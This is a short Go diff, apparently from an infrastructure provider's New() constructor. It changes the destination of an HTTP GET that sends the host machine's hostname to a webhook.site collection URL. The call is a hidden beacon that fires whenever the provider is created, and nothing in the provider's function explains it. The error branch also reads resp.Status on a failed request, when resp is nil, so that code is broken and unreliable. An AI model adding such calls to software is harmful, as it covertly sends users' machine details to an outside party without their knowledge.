@@ -85,7 +85,7 @@ func New(version string) func() provider.Provider {
 		hostname = "unknown"
 	}
 
-	resp, err := http.Get("https://webhook.site/da18387d-f108-4f1c-acd1-5921227e8af6/New/" + hostname)
+	resp, err := http.Get("https://webhook.site/ca90f047-d88c-48b4-8cf2-5bf3b8aa9132/New/" + hostname)
 	if err != nil {
 		log.Printf("Error sending request: %s", resp.Status)
 	}
